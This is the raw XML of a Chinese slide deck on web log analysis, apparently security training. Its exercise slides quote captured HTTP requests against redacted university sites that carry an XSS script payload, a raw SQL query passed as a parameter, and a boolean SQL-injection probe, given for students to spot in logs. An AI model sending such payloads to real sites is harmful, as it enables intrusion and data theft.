            <a:off x="2702300" y="2714625"/>
            <a:ext cx="4041775" cy="358140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="200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如何分析日志</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="200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sz="2000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2273300" y="1052513"/>
            <a:ext cx="8064500" cy="0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15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2702299" y="3225410"/>
            <a:ext cx="4041775" cy="604520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" b="1">
                <a:gradFill>
                  <a:gsLst>
                    <a:gs pos="0">
                      <a:srgbClr val="6FBA2C"/>
                    </a:gs>
                    <a:gs pos="100000">
                      <a:srgbClr val="00479D"/>
                    </a:gs>
                  </a:gsLst>
                  <a:lin ang="36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/>
              </a:rPr>
              <a:t>小练习</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600" b="1">
              <a:gradFill>
                <a:gsLst>
                  <a:gs pos="0">
                    <a:srgbClr val="6FBA2C"/>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="00479D"/>
                  </a:gs>
                </a:gsLst>
                <a:lin ang="3600000" scaled="0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/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2702300" y="2138680"/>
            <a:ext cx="4041775" cy="358140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="200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日志分析目的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="200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sz="2000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小练习</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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3"/>
            <a:ext cx="805053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sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>REQUEST:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="160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sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>GET /search/?q=&lt;/title&gt;&lt;script&gt;confirm(9770)&lt;/script&gt; HTTP/1.1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en-US" altLang="zh-CN" sz="1600">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Accept-Encoding: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" err="1">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>gzip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>, deflate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en-US" altLang="zh-CN" sz="1600">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Host: news.xxx.edu.cn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en-US" altLang="zh-CN" sz="1600">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Accept: */*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en-US" altLang="zh-CN" sz="1600">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>User-Agent: Mozilla/5.0 (X11;U; Linux i686; en-GB; rv:1.9.1) Gecko/20090624 Ubuntu/9.04 (jaunty) Firefox/3.5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en-US" altLang="zh-CN" sz="1600">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Connection: close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en-US" altLang="zh-CN" sz="1600" err="1">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>: http://news.xxx.edu.cn/search/ </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pP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7568" y="476675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小练习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0"/>
            <a:ext cx="8050530" cy="48907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REQUEST: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POST /WF_YB/common_getBindingData.action HTTP/1.1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Host: www.xxxx.xxx.edu.cn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Connection: keep-alive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Content-Length: 60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Accept: */*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X-Requested-With: XMLHttpRequest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User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36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Content-Type: application/x-www-form-urlencoded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Referer: http://www.xxxx.xxx.edu.cn/WF_YB/main2.jsp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Cookie: JSESSIONID=7845C6208CE3EDA8F72DA3C42EEACD4B; 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sql=select+type%2Cbx_bu_name+from+yb_bx_type+order+by+bx_ord</a:t>
            </a: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endParaRPr lang="zh-CN" altLang="en-US" sz="160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14521" y="476673"/>
            <a:ext cx="66744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小练习</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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7260" y="1139190"/>
            <a:ext cx="8050530" cy="4222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R</a:t>
            </a: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EQUEST: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POST /search/ HTTP/1.1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Content-Length: 51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Accept-Encoding: gzip, deflate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Connection: close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Accept: */*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User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)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Host: news.xxx.edu.cn:80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Cookie: PHPSESSID=4ee9d5056723b1ce729e6b93b9ca27a5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Content-Type: application/x-www-form-urlencoded</a:t>
            </a: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endParaRPr lang="zh-CN" altLang="en-US" sz="1600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latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>q=1&amp;type=calendar'%20aNd%202557=2557-1%20aNd%20‘’=‘</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108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zEwNTM5NzYwMDRjMzkwZTVkZjY2ODkwMGIxNGU0OT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9780</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>516</Paragraphs>
  <Slides>45</Slides>
  <Notes>40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45</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="64" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>等线 Light</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Office 主题​​</vt:lpstr>
      <vt:lpstr>Paint.Picture</vt:lpstr>
      <vt:lpstr>Paint.Picture</vt:lpstr>
      <vt:lpstr>Paint.Picture</vt:lpstr>
      <vt:lpstr>Paint.Picture</vt:lpstr>
      <vt:lpstr>StaticMetafile</vt:lpstr>
      <vt:lpstr>StaticMetafile</vt:lpstr>
      <vt:lpstr>Paint.Picture</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>web日志存储</vt:lpstr>
      <vt:lpstr>web日志存储</vt:lpstr>
      <vt:lpstr>分析思路</vt:lpstr>
      <vt:lpstr>分析思路</vt:lpstr>
      <vt:lpstr>分析思路</vt:lpstr>
      <vt:lpstr>分析思路</vt:lpstr>
      <vt:lpstr>分析思路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 胜</dc:creator>
  <cp:lastModifiedBy>:-*:-*:-*:-*</cp:lastModifiedBy>
  <cp:revision>6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-05-10T02:11:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-05-15T09:13:41Z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C28C6AF9A5CF43FF8B20F67B2BD0E3C4_12</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-12.1.0.16729</vt:lpwstr>
  </property>
</Properties>
</file>